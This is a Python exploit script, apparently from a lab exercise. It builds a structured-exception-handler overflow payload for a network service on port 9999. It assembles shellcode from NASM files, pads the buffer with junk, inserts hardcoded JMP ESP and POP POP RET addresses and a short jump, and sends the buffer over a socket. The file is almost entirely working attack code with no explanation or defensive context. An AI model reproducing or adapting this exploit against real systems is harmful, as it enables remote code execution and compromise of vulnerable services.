import os
import socket
import random

# Random string creation   
def rndstr(size, min_l, max_l):
    out = ""
    for i in range(0, size):
        out += chr(random.randint(min_l, max_l))
    return out

os.system("nasm prog1.asm") #Prog1
os.system("nasm prog2.asm") #Prog2

# Connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1",9999))
print(sock.recv(1000))


shellcode_call = open("c:\\users\\ieuser\\desktop\\prog1","r").read() # Main shellcode
shellcode_jumpBack = open("c:\\users\\ieuser\\desktop\\prog2","r").read() # Jump shellcode
junk = open("c:\\users\\ieuser\\desktop\\msg.bin","r").read()[0:0x7dc] # Fill junk

tmp = ""
tmp += junk                 # Add junk
tmp += "\xAF\x11\x50\x62"   # JMP esp
tmp += "\xeb\x06BB"         # Next SEH record
tmp += "\xB4\x10\x50\x62"   # POP POP RET
tmp += shellcode_call       # Add main shellcode
tmp += shellcode_jumpBack   # Jump back
tmp += "D"*(5000-len(tmp))  # Fill the rest
sock.send(tmp)
     
sock.close()
